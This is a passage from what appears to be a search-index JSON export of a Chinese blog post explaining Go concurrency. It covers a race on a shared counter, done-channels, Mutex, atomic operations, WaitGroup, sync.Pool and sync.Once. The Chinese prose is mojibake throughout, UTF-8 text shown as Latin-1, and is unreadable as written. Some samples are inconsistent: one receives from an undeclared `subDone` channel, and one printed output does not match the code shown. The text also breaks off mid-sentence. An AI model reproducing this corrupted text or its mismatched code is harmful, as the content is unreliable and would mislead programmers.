æˆ‘ä»¬ç”¨ä¸€ä¸ªå…±äº«å˜é‡sharedCounterä½œä¸ºä¸€ä¸ªè®¡æ•°å™¨. addå‡½æ•°åœ¨è®¡æ•°å™¨ä¸Šå¾ªç¯æ·»åŠ ä¸€å®šçš„æ•°å€¼, subåˆ™ç›¸å, showåˆ™æ˜¯æ‰“å°è®¡æ•°å™¨å½“å‰çš„å€¼. ç¨‹åºè¿è¡Œç»“æŸå, sharedCounteråº”è¯¥ä¸º0, ä¸Šé¢ä»£ç çš„è¾“å‡ºçš„ç¡®å¦‚æ­¤. ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:1:0","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"ä½¿ç”¨ä¸€ä¸ªåç¨‹ å¦‚æœå¯¹è®¡æ•°å™¨è¿›è¡ŒåŠ å‡çš„è°ƒç”¨åœ¨ä¸åŒçš„åç¨‹é‡Œé¢, ä¼šæ€ä¹ˆæ ·å‘¢? func main() { add(1000000) go sub(1000000) show() } ä¼šå¾—åˆ°1000000 , å› ä¸ºgo sub(1000000)åˆšå¯åŠ¨, ç¨‹åºå°±é€€å‡ºäº†. æˆ–è®¸æˆ‘ä»¬åº”è¯¥ç­‰åˆ°subå‡½æ•°æ‰§è¡Œç»“æŸ ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:2:0","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"ç­‰å¾…åç¨‹ç»“æŸ é”™è¯¯çš„æ–¹å¼ å¦‚æœæœ‰Cè¯­è¨€å¼€å‘èƒŒæ™¯, å¯èƒ½ä¼šæƒ³åˆ°é€šè¿‡è®¾ç½®ä¸€ä¸ªflagæ¥æŒ‡ç¤ºè¿ç®—æ˜¯å¦ç»“æŸ, æ¯”å¦‚: func sub(count int, done *bool) { for i := 0; i \u003c count; i++ { sharedCounter-- } *done = true } //.... func main() { add(1000000) done := false go sub(1000000, \u0026done) for !done { time.Sleep(time.Millisecond * 10) } show() } è¿™è™½ç„¶ä¹Ÿèƒ½å¾—åˆ°æ­£ç¡®çš„è¾“å‡º, ä½†éå¸¸ä¸ä¼˜é›…. æ­£ç¡®çš„æ–¹å¼1 å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ— ç¼“å†²çš„ä¿¡é“(æˆ–è€…è¯´å®¹é‡ä¸º1çš„ä¿¡é“)æ¥å……å½“flag //... func sub(count int, done chan bool) { for i := 0; i \u003c count; i++ { sharedCounter-- } done \u003c- true } //.... func main() { add(1000000) done := make(chan bool) go sub(1000000, done) \u003c-subDone show() } è¿™é‡Œåˆ©ç”¨äº†ä¿¡é“çš„ç‰¹ç‚¹: å½“ä»ä¿¡é“ä¸­è¯»å–æ•°æ®æ—¶,å¦‚æœä¿¡é“ä¸ºç©º,è¯»å–å°†è¢«é˜»å¡ç›´åˆ°æœ‰æ•°æ®åˆ°è¾¾. æ‰€ä»¥ \u003c-subDone ä¼šä¸€ç›´é˜»å¡, ç›´åˆ°é€šè¿‡subDone \u003c- trueå‘å…¶ä¸­å†™å…¥äº†æ•°æ® ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:2:1","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"ä½¿ç”¨2ä¸ªåç¨‹ ä¸Šé¢çš„ä¾‹å­ä¸­, sub(1000000, done)æ˜¯åœ¨æ–°çš„åç¨‹ä¸­è¿è¡Œçš„, add(1000000)å´ä¸æ˜¯, å¦‚æœä»–ä»¬éƒ½åœ¨æ–°åç¨‹ä¸­è¿è¡Œ, ä¸»ç¨‹åºåº”è¯¥å¦‚ä½•ç­‰å¾…ä»–ä»¬ç»“æŸå‘¢ å¾ˆå®¹æ˜“æƒ³åˆ°, ä½¿ç”¨ä¸¤æ¬¡\u003c-done ä¹Ÿå°±æ˜¯è¯´å‘ä¿¡é“ç´¢è¦ä¸¤ä¸ªè®¡ç®—å®Œæˆçš„æ ‡å¿—, addå’Œ sub è®¡ç®—å®Œæˆååˆ†åˆ«å‘å…¶ä¸­æ”¾å…¥æ ‡å¿—. package main import \"fmt\" var ( sharedCounter = 0 ) func add(count int, done chan bool) { for i := 0; i \u003c count; i++ { sharedCounter++ } fmt.Println(\"add done\") done \u003c- true } func sub(count int, done chan bool) { for i := 0; i \u003c count; i++ { sharedCounter-- } fmt.Println(\"sub done\") done \u003c- true } func show() { fmt.Println(sharedCounter) } func main() { done := make(chan bool) go add(1000000, done) go sub(1000000, done) \u003c-done \u003c-done show() } ä¸ºäº†æ˜ç¡®çŸ¥é“mainå‡½æ•°çš„ç¡®æ˜¯ç­‰å¾…ä¸¤ä¸ªåç¨‹æ‰§è¡Œå®Œæ¯•äº†çš„, æˆ‘ä»¬åœ¨å…¶ä¸­åŠ å…¥äº†fmt.Println(\"sub done\")è¿™æ ·çš„è¾“å‡º è¿è¡Œç¨‹åº, å¾—åˆ° add done sub done 824933 Opps, è™½ç„¶addå’Œsub éƒ½æ‰§è¡Œå®Œæ¯•äº†,ä½†æ˜¯ç»“æœä¸å¯¹(å¹¶ä¸”å¤šæ¬¡è¿è¡Œçš„ç»“æœè¿˜ä¸ç›¸åŒ), æœŸæœ›æ¥æ”¶åº”è¯¥æ˜¯0 å†è¿è¡Œä¸€æ¬¡, å¾—åˆ°: sub done add done -481342 åŸå› æ˜¯addå’Œsubåœ¨äº¤å‰è¯»å–å’Œå†™å…¥sharedCounterè¿™ä¸ªå˜é‡, ä»–ä»¬å…±äº«äº†å˜é‡, ä½†åœ¨è¯»å–å’Œå†™å…¥çš„æ—¶å€™å‡ºç°**â€œç«æ€â€** ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:3:0","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"ç«æ€ æœ‰å¤šä¸ªåç¨‹è¿è¡Œæ—¶, å¯¹äºæ¯ä¸ªåç¨‹è€Œè¨€,å…¶å†…éƒ¨ä»£ç æ—¶é¡ºåºæ‰§è¡Œçš„, ä½†æ— æ³•ç¡®å®šåç¨‹ä¹‹é—´çš„æ‰§è¡Œé¡ºåº, é‚£ä¹ˆå°±è¯´è¿™äº›åç¨‹æ˜¯å¹¶å‘çš„ å¦‚æœä¸€æ®µä»£ç æ— è®ºæ˜¯é¡ºåºæ‰§è¡Œè¿˜æ˜¯å¹¶å‘æ‰§è¡Œ,å…¶ç»“æœéƒ½æ˜¯ç¡®å®šçš„,é‚£ä¹ˆè¿™ä¸ªä»£ç å°±æ˜¯å¹¶å‘å®‰å…¨çš„. ç›¸å, å¹¶å‘ä¸å®‰å…¨çš„ä»£ç ,å¯èƒ½ä¼šå‡ºç°æ­»é”,æ´»é”,ç«æ€ ç«æ€åˆ™è¡¨ç¤ºä»£ç å¯æ‰§è¡Œ,ä½†å¯èƒ½å‡ºç°ç»“æœä¸ä¸€è‡´(é”™è¯¯ç»“æœ) ###è§£å†³æ–¹æ³•1, åˆ©ç”¨ä¿¡é“ func main() { done := make(chan bool) go add(1000000, done) \u003c-done //1 go sub(1000000, done) \u003c-done //2 show() } åœ¨addæ‰§è¡Œå®Œæ¯•ä¹‹å‰, é¦–å…ˆä¼šå µå¡åœ¨//1å¤„, func add(count int, done chan bool) { //.... done \u003c- true } addå‡½æ•°æ‰§è¡Œæœ€åä¸€å¥ done \u003c- true å \u003c-done //1èƒ½å–åˆ°å€¼, æ¥è§¦é˜»å¡. ç„¶åç»§ç»­å¾€ä¸‹æ‰§è¡Œsubå‡½æ•°. è¿™è™½ç„¶èƒ½å¾—åˆ°æ­£ç¡®è¾“å‡º, ä½†, æˆ‘ä»¬å‘ç°, è¿™å®é™…æ˜¯å°†å¹¶è¡Œæ‰§è¡Œä¿®æ”¹æˆäº†ä¸²è¡Œæ‰§è¡Œ. ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:3:1","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"è§£å†³æ–¹æ³•2, åˆ©ç”¨ Mutex æˆ– RWMutex sync.Mutex å¯èƒ½æ˜¯åŒæ­¥åŒ…ä¸­ä½¿ç”¨æœ€å¹¿æ³›çš„åŸè¯­ã€‚å®ƒå…è®¸å¯¹å…±äº«èµ„æºè¿›è¡Œäº’æ–¥ï¼ˆä¸èƒ½åŒæ—¶è®¿é—®). mutex := \u0026sync.Mutex{} mutex.Lock() //.... æ›´æ–°å…±äº«å˜é‡ mutex.Unlock() æ³¨æ„: åœ¨å®˜æ–¹æ–‡æ¡£ä¸­æœ‰è¿™ä¹ˆä¸€å¥ â€œValues containing the types defined in this package should not be copied.â€ (â€œåŒ…å«è¿™ä¸ªåŒ…ä¸­å®šä¹‰çš„ç±»å‹çš„å€¼ä¸åº”è¯¥è¢«å¤åˆ¶ã€‚â€) . æˆ‘ä»¬ç›´åˆ°å€¼ä¼ é€’å°±æ˜¯å¤åˆ¶ç„¶åä¼ é€’, æ‰€ä»¥æˆ‘ä»¬ä»£ç ä¸­çš„mutexç”¨çš„æ˜¯å¼•ç”¨ä¼ é€’. package main import ( \"fmt\" \"sync\" ) var ( sharedCounter = 0 mutex = \u0026sync.Mutex{} ) func add(count int, done chan bool) { for i := 0; i \u003c count; i++ { mutex.Lock() sharedCounter++ mutex.Unlock() } fmt.Println(\"add done\") done \u003c- true } func sub(count int, done chan bool) { for i := 0; i \u003c count; i++ { mutex.Lock() sharedCounter-- mutex.Unlock() } fmt.Println(\"sub done\") done \u003c- true } func show() { fmt.Println(sharedCounter) } func main() { done := make(chan bool) go add(1000000, done) go sub(1000000, done) \u003c-done \u003c-done show() } åœ¨è¯»å†™sharedCounterä¹‹å‰å…ˆLock(), ç”¨å®ŒåUnlock() å¦‚æœæˆ‘ä»¬åœ¨è¿›è¡Œè®¡ç®—çš„æ—¶å€™åŠ ä¸Šç‚¹æ‰“å°(ä»…æµ‹è¯•ç”¨,éå¸¸å½±å“é€Ÿåº¦) for i := 0; i \u003c count; i++ { mutex.Lock() fmt.Println(\"--\") // fmt.Println(\"++\") sharedCounter-- // sharedCounter++ mutex.Unlock() } åˆ™å¯ä»¥çœ‹åˆ° ++ å’Œ â€“ æ˜¯äº¤å‰ç€æ‰“å°çš„, è¯´æ˜æ˜¯å¹¶è¡Œæ‰§è¡Œçš„. å¦å¤–, è¿˜æœ‰RWMutex (è¯»å†™é”), é™¤äº†ä¸Mutexç›¸åŒçš„Lock()å’ŒUnlock()æ–¹æ³•å¤–, å…¶è¿˜æœ‰ç”¨äºå…±äº«è¯»æ“ä½œçš„RLock()å’ŒRUnlock(), åœ¨è¯»å–å…±äº«å˜é‡æ—¶å…è®¸åŒæ—¶å¤šä¸ªè¯»å–å™¨èƒ½æé«˜æ•ˆç‡. æ‰€ä»¥åœ¨é¢‘ç¹è¯»å†™æ“ä½œçš„ä»£ç ä¸­, ä½¿ç”¨RWMutexæ•ˆç‡è¦æ¯”Mutexé«˜ ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:3:2","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"è§£å†³æ–¹æ³•3, åˆ©ç”¨åŸå­æ“ä½œ åŸå­æ“ä½œåœ¨\"sync/atomic\"åŒ…ä¸­. åˆ©ç”¨è¿™ä¸ªåŒ…ä¸­æä¾›çš„å‡½æ•°å¯å®ç°\"æ— é”ç‰ˆ\"çš„å…±äº«å˜é‡è¯»å†™ åŸå­æ“ä½œå³æ˜¯è¿›è¡Œè¿‡ç¨‹ä¸­ä¸èƒ½è¢«ä¸­æ–­çš„æ“ä½œï¼Œé’ˆå¯¹æŸä¸ªå€¼çš„åŸå­æ“ä½œåœ¨è¢«è¿›è¡Œçš„è¿‡ç¨‹ä¸­ï¼ŒCPUç»ä¸ä¼šå†å»è¿›è¡Œå…¶ä»–çš„é’ˆå¯¹è¯¥å€¼çš„æ“ä½œã€‚ä¸ºäº†å®ç°è¿™æ ·çš„ä¸¥è°¨æ€§ï¼ŒåŸå­æ“ä½œä»…ä¼šç”±ä¸€ä¸ªç‹¬ç«‹çš„CPUæŒ‡ä»¤ä»£è¡¨å’Œå®Œæˆã€‚åŸå­æ“ä½œæ˜¯æ— é”çš„ï¼Œå¸¸å¸¸ç›´æ¥é€šè¿‡CPUæŒ‡ä»¤ç›´æ¥å®ç°ã€‚ äº‹å®ä¸Šï¼Œå…¶å®ƒåŒæ­¥æŠ€æœ¯çš„å®ç°å¸¸å¸¸ä¾èµ–äºåŸå­æ“ä½œ package main import ( \"fmt\" \"sync/atomic\" ) var ( sharedCounter = int64(0) ) func add(count int, done chan bool) { for i := 0; i \u003c count; i++ { atomic.AddInt64(\u0026sharedCounter, 1) // } fmt.Println(\"add done\") done \u003c- true } func sub(count int, done chan bool) { for i := 0; i \u003c count; i++ { atomic.AddInt64(\u0026sharedCounter, -1) // } fmt.Println(\"sub done\") done \u003c- true } func show() { fmt.Println(sharedCounter) } func main() { done := make(chan bool) go add(1000000, done) go sub(1000000, done) \u003c-done \u003c-done show() } åŸå­æ“ä½œçš„å¸¸ç”¨æ¥å£å¦‚ä¸‹(ä»¥int32ä¸ºä¾‹) //å°†addræŒ‡å‘çš„å€¼å’Œoldè¿›è¡Œæ¯”è¾ƒ, å¦‚æœç›¸ç­‰,åˆ™å°†newèµ‹å€¼åˆ°addræŒ‡å‘çš„ä½ç½®,å¹¶è¿”å›true, å¦‚æœä¸ç›¸ç­‰,åˆ™ç›´æ¥è¿”å›false func CompareAndSwapInt32(addr *int32, old, new int32) (swapped bool) //ä½¿ç”¨åŸå­æ“ä½œ,å°†addræŒ‡å‘çš„ä½ç½®å¢åŠ ä¸€ä¸ªdelta func AddInt32(addr *int32, delta int32) (new int32) //åŸå­è¯»å– //å½“æˆ‘ä»¬è¦è¯»å–ä¸€ä¸ªå˜é‡çš„æ—¶å€™ï¼Œå¾ˆæœ‰å¯èƒ½è¿™ä¸ªå˜é‡æ­£åœ¨è¢«å†™å…¥ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±å¾ˆæœ‰å¯èƒ½è¯»å–åˆ°å†™åˆ°ä¸€åŠçš„æ•°æ®ã€‚ æ‰€ä»¥è¯»å–æ“ä½œæ˜¯éœ€è¦ä¸€ä¸ªåŸå­è¡Œä¸ºçš„ã€‚ func LoadInt32(addr *int32) (val int32) //è¯»å–æ˜¯æœ‰åŸå­æ€§çš„æ“ä½œçš„ï¼ŒåŒæ ·å†™å…¥atomicåŒ…ä¹Ÿæä¾›äº†ç›¸å…³çš„æ“ä½œåŒ… func StoreInt32(addr *int32, val int32) //æ­¤ç±»å‹çš„å€¼ç›¸å½“äºä¸€ä¸ªå®¹å™¨ï¼Œå¯ä»¥è¢«ç”¨æ¥â€œåŸå­åœ°\"å­˜å‚¨ï¼ˆStoreï¼‰å’ŒåŠ è½½ï¼ˆLoadï¼‰ä»»æ„ç±»å‹çš„å€¼ã€‚å½“ç„¶è¿™ä¸ªç±»å‹ä¹Ÿæ˜¯åŸå­æ€§çš„ã€‚ //æœ‰äº†atomic.Valueè¿™ä¸ªç±»å‹ï¼Œè¿™æ ·ç”¨æˆ·å°±å¯ä»¥åœ¨ä¸ä¾èµ–Goå†…éƒ¨ç±»å‹unsafe.Pointerçš„æƒ…å†µä¸‹ä½¿ç”¨åˆ°atomicæä¾›çš„åŸå­æ“ä½œã€‚ // A Value must not be copied after first use. type Value struct { v interface{} } åŸå­æ“ä½œä¸äº’æ–¥é”çš„åŒºåˆ« é¦–å…ˆatomicæ“ä½œçš„ä¼˜åŠ¿æ˜¯æ›´è½»é‡ï¼Œæ¯”å¦‚CASå¯ä»¥åœ¨ä¸å½¢æˆä¸´ç•ŒåŒºå’Œåˆ›å»ºäº’æ–¥é‡çš„æƒ…å†µä¸‹å®Œæˆå¹¶å‘å®‰å…¨çš„å€¼æ›¿æ¢æ“ä½œã€‚è¿™å¯ä»¥å¤§å¤§çš„å‡å°‘åŒæ­¥å¯¹ç¨‹åºæ€§èƒ½çš„æŸè€—ã€‚ åŸå­æ“ä½œä¹Ÿæœ‰åŠ£åŠ¿ã€‚è¿˜æ˜¯ä»¥CASæ“ä½œä¸ºä¾‹ï¼Œä½¿ç”¨CASæ“ä½œçš„åšæ³•è¶‹äºä¹è§‚ï¼Œæ€»æ˜¯å‡è®¾è¢«æ“ä½œå€¼æœªæ›¾è¢«æ”¹å˜ï¼ˆå³ä¸æ—§å€¼ç›¸ç­‰ï¼‰ï¼Œå¹¶ä¸€æ—¦ç¡®è®¤è¿™ä¸ªå‡è®¾çš„çœŸå®æ€§å°±ç«‹å³è¿›è¡Œå€¼æ›¿æ¢ï¼Œé‚£ä¹ˆåœ¨è¢«æ“ä½œå€¼è¢«é¢‘ç¹å˜æ›´çš„æƒ…å†µä¸‹ï¼ŒCASæ“ä½œå¹¶ä¸é‚£ä¹ˆå®¹æ˜“æˆåŠŸã€‚è€Œä½¿ç”¨äº’æ–¥é”çš„åšæ³•åˆ™è¶‹äºæ‚²è§‚ï¼Œæˆ‘ä»¬æ€»å‡è®¾ä¼šæœ‰å¹¶å‘çš„æ“ä½œè¦ä¿®æ”¹è¢«æ“ä½œçš„å€¼ï¼Œå¹¶ä½¿ç”¨é”å°†ç›¸å…³æ“ä½œæ”¾å…¥ä¸´ç•ŒåŒºä¸­åŠ ä»¥ä¿æŠ¤ã€‚ ä¸‹é¢æ˜¯å‡ ç‚¹åŒºåˆ«ï¼š äº’æ–¥é”æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œç”¨æ¥è®©ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œç¨‹åºçš„å…³é”®éƒ¨åˆ†ï¼Œå®Œæˆäº’æ–¥çš„å¤šä¸ªæ“ä½œ åŸå­æ“ä½œæ˜¯æ— é”çš„ï¼Œå¸¸å¸¸ç›´æ¥é€šè¿‡CPUæŒ‡ä»¤ç›´æ¥å®ç° åŸå­æ“ä½œä¸­çš„casè¶‹äºä¹è§‚é”ï¼ŒCASæ“ä½œå¹¶ä¸é‚£ä¹ˆå®¹æ˜“æˆåŠŸï¼Œéœ€è¦åˆ¤æ–­ï¼Œç„¶åå°è¯•å¤„ç† å¯ä»¥æŠŠäº’æ–¥é”ç†è§£ä¸ºæ‚²è§‚é”ï¼Œå…±äº«èµ„æºæ¯æ¬¡åªç»™ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ï¼Œå…¶å®ƒçº¿ç¨‹é˜»å¡ï¼Œç”¨å®Œåå†æŠŠèµ„æºè½¬è®©ç»™å…¶å®ƒçº¿ç¨‹ ä¸è¦è½»æ˜“ä½¿ç”¨atomic https://texlution.com/post/golang-lock-free-values-with-atomic-value/ ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:3:3","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"å…¶å®ƒå¹¶å‘æ§åˆ¶æ–¹æ³• ä¸Šé¢çš„ä¾‹å­ä¸­, æˆ‘ä»¬éƒ½æ˜¯ä½¿ç”¨çš„ä¿¡é“æ¥è¿›è¡Œå¹¶å‘æ§åˆ¶ (done \u003c- trueä¸\u003c-done), è¿™åªæ˜¯å¸¸ç”¨çš„æ–¹æ³•ä¹‹ä¸€ ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:4:0","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"WaitGroup sync.WaitGroup æ‹¥æœ‰ä¸€ä¸ªå†…éƒ¨è®¡æ•°å™¨ã€‚å¦‚æœæ­¤è®¡æ•°å™¨ç­‰äº 0ï¼Œåˆ™ Wait() æ–¹æ³•ç«‹å³è¿”å›ã€‚å¦åˆ™ï¼Œå®ƒå°†è¢«é˜»å¡ï¼Œç›´åˆ°è®¡æ•°å™¨ä¸º 0ã€‚ è¦å¢åŠ è®¡æ•°å™¨ï¼Œæˆ‘ä»¬å¿…é¡»ä½¿ç”¨ Add(int)ã€‚è¦å‡å°‘å®ƒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Done() ï¼ˆå°†å‡å°‘ 1ï¼‰æˆ–å…·æœ‰è´Ÿå€¼çš„ç›¸åŒ Add(int) æ–¹æ³•ã€‚ package main import ( \"fmt\" \"sync\" \"sync/atomic\" ) var ( sharedCounter = int64(0) ) func add(count int, wg *sync.WaitGroup) { for i := 0; i \u003c count; i++ { atomic.AddInt64(\u0026sharedCounter, 1) } fmt.Println(\"add done\") wg.Done() } func sub(count int, wg *sync.WaitGroup) { for i := 0; i \u003c count; i++ { atomic.AddInt64(\u0026sharedCounter, -1) } fmt.Println(\"sub done\") wg.Done() } func show() { fmt.Println(sharedCounter) } func main() { wg := sync.WaitGroup{} wg.Add(2) go add(1000000, \u0026wg) go sub(1000000, \u0026wg) wg.Wait() show() } æ³¨æ„:ä¼ é€’ WaitGroupæ—¶è¦ä½¿ç”¨å¼•ç”¨ä¼ é€’(æŒ‡é’ˆ), å…¶ä¸åº”è¯¥è¢«å¤åˆ¶. func sub(count int, wg *sync.WaitGroup) ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:4:1","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"context.Context Contextæä¾›äº†2ä¸ªåŠŸèƒ½ æ§åˆ¶å­åç¨‹ç»“æŸ ä¼ é€’å€¼ å…¶ä¸åœ¨syncåŒ…ä¸­, åé¢ä¸“é—¨è®² ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:4:2","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"sync.Pool å¯¹è±¡å¤ç”¨ å…¶æä¾›ä¸€ä¸ª\"å¹¶å‘å®‰å…¨\"çš„å¯å¤ç”¨çš„å¯¹è±¡æ± . ç”¨æ¥å‡å°‘é¢‘ç¹GCæ‰€ä»£ç†çš„å‹åŠ›. å…¶å¤§æ¦‚æ„æ€æ˜¯: å¦‚æœæœ‰æ—§å¯¹è±¡å¯ç”¨,åˆ™ç”¨æ—§çš„, æ²¡æœ‰å†Newä¸€ä¸ª å‚è€ƒè¿™æ‰¹æ–‡ç« : https://www.cnblogs.com/qcrao-2018/p/12736031.html ä»¥åŠè¿™é‡Œ https://geektutu.com/post/hpg-sync-pool.html åœ¨å®é™…å¼€å‘å·¥ä½œä¸­, ä¸è¦ä¸€ä¸Šæ¥å°±æƒ³åšä½¿ç”¨sync.Poolå®ƒé€šå¸¸ä¼šå¸¦æ¥é—®é¢˜(å› ä¸ºå…¶Getå‡ºæ¥çš„å¯¹è±¡çš„çŠ¶æ€æ˜¯ä¸ç¡®å®šçš„), è€Œåº”è¯¥éµå¾ªä¸‹é¢çš„åŸåˆ™: æ ¹æ®ä½ æ”¶é›†åˆ°çš„éœ€æ±‚è®¾è®¡ä½ çš„ä»£ç ï¼ˆä¸è¦è·³è¿‡è¿™ä¸ªæ­¥éª¤ï¼‰ã€‚ ç¼–å†™æœ€ç®€å•ã€æœ€æ¸…æ™°ã€æœ€æ„šè ¢çš„è®¾è®¡å®ç°ã€‚ å¦‚æœå®¢æˆ·æ»¡æ„ï¼Œå°±åœæ­¢ å¦‚æœå®¢æˆ·ä¸æ»¡æ„ï¼Œè€Œä¸”ä»–ä»¬è®¤ä¸ºåº”ç”¨ç¨‹åºçš„æ€§èƒ½ä¸èƒ½æ»¡è¶³ä»–ä»¬çš„è¦æ±‚ï¼Œé‚£ä¹ˆå°±å‰–æã€‚ è§£å†³æœ€é«˜æ€§èƒ½çš„ä¸»å¯¼è€… å‰–æå¹¶è¿›å…¥ç¬¬äº”é˜¶æ®µã€‚ç„¶åè¿›å…¥3 å¦‚æœå®åœ¨æä¸å®š, å†æƒ³æƒ³sync.Pool ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:5:0","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"sync.Once åªæ‰§è¡Œä¸€æ¬¡ sync.Once æä¾›äº†ä¸€ç§æ–¹æ³•, è®©ç›¸å…³ä»£ç åªè¢«æ‰§è¡Œä¸€æ¬¡ å®é™…å¼€å‘è¿‡ç¨‹ä¸­, ç»å¸¸æœ‰è¿™æ ·çš„åœºæ™¯: ä½ åšäº†ä¸€ä¸ªå«åšlowLevelApiçš„åŒ…, ç”¨äºæ§åˆ¶åº•å±‚è®¾å¤‡, æ¯”å¦‚å¼€å…³LED, ä½†åœ¨è°ƒç”¨å¼€å…³LEDä¹‹å‰éœ€è¦ç¡®ä¿ä¸€äº›åˆå§‹åŒ–å·¥ä½œå·²ç»å®Œæˆ, æ‰€ä»¥ä½ å†™äº†ä¸€ä¸ªInitEnvçš„å‡½æ•°, å¹¶å‘Šè¯‰å…¶å®ƒå¼€å‘äººå‘˜: ä¸€å®šè¦å…ˆåˆå§‹åŒ–å“¦. package lowLevelApi import \"fmt\" func InitEnv() { fmt.Println(\"init environment\") } func LedOn() { fmt.Println(\"LedOn\") } func LedOff() { fmt.Println(\"LedOff\") } å…¶å®ƒå¼€å‘äººå‘˜ç»å¸¸ä¼šé—®ä½ : è¿™ä¸ªåˆå§‹åŒ–å‡½æ•°å¦‚æœè¢«é‡å¤è°ƒç”¨ä¸ä¼šå‡ºé—®é¢˜å§? å› ä¸ºä»–ä»¬çš„ä»£ç é€šå¸¸ä¼šè¿™æ ·å†™: package main import ( \"fmt\" \"goplayground/lowLevelApi\" ) func turnLedOn() { fmt.Println(\"Turning LED on\") lowLevelApi.InitEnv() lowLevelApi.LedOn() fmt.Println(\"LED on\") } func turnLedOff() { fmt.Println(\"Turning LED off\") lowLevelApi.InitEnv() lowLevelApi.LedOff() fmt.Println(\"LED off\") } func main() { turnLedOn() turnLedOff() } ä¸Šé¢çš„ä»£ç ä¼šè¾“å‡º Turning LED on InitEnv LedOn LED on Turning LED off InitEnv LedOff LED off ä¸ºäº†é˜²æ­¢é‡å¤è°ƒç”¨InitEnv()å¯èƒ½å¸¦æ¥çš„é—®é¢˜, åˆ™å¯ä»¥ä½¿ç”¨sync.Once var ( once sync.Once ) func InitEnv() { once.Do(func() { fmt.Println(\"InitEnv\") }) } è¿™æ ·InitEnv()å³ä½¿è¢«å¤šæ¬¡è°ƒç”¨, å…¶å†…éƒ¨é€»è¾‘åªä¼šæ‰§è¡Œä¸€æ¬¡ Turning LED on InitEnv LedOn LED on Turning LED off LedOff LED off sync.Once å¸¸åº”ç”¨äºå•ä¾‹æ¨¡å¼ï¼Œä¾‹å¦‚åˆå§‹åŒ–é…ç½®ã€ä¿æŒæ•°æ®åº“è¿æ¥ç­‰ã€‚ä½œç”¨ä¸ init å‡½æ•°ç±»ä¼¼ï¼Œä½†æœ‰åŒºåˆ«ã€‚ init å‡½æ•°æ˜¯å½“æ‰€åœ¨çš„ package é¦–æ¬¡è¢«åŠ è½½æ—¶æ‰§è¡Œï¼Œè‹¥è¿Ÿè¿Ÿæœªè¢«ä½¿ç”¨ï¼Œåˆ™æ—¢æµªè´¹äº†å†…å­˜ï¼Œåˆå»¶é•¿äº†ç¨‹åºåŠ è½½æ—¶é—´ã€‚ sync.Once å¯ä»¥åœ¨ä»£ç 